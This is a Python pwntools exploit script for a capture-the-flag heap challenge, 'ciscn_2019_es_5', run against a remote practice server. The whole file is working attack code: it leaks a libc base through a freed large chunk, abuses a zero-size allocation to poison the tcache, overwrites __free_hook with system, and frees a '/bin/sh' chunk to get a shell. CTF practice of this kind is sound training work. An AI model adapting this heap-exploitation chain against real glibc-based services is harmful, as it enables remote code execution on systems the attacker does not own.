from pwn import *

#p = process('./ciscn_2019_es_5')
p = remote('node4.buuoj.cn', 27111)
libc = ELF('libc-2.27.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)

def alloc(size, content):
    sla(b'choice:', b'1')
    sla(b'size?>', str(size).encode())
    sa(b'content:', content)

def delete(idx):
    sla(b'choice:', b'4')
    sla(b'Index:', str(idx).encode())

def edit(idx, content):
    sla(b'choice:', b'2')
    sla(b'Index:', str(idx).encode())
    if(content != b''):
        sa(b'content:', content)

def show(idx):
    sla(b'choice:', b'3')
    sla(b'Index:', str(idx).encode())

alloc(0x410, b'a') #0
alloc(0x30, b'/bin/sh\x00') #1
delete(0)
alloc(0x30, b'a' * 8) #0
show(0)

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 1104 - 0x10 - libc.sym['__malloc_hook']
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
success('libc_base -> 0x%x' % libc_base)

alloc(0, b'') #2
edit(2, b'')
delete(2)

alloc(0x10, p64(free_hook))
alloc(0x10, p64(system))

delete(1)

p.interactive()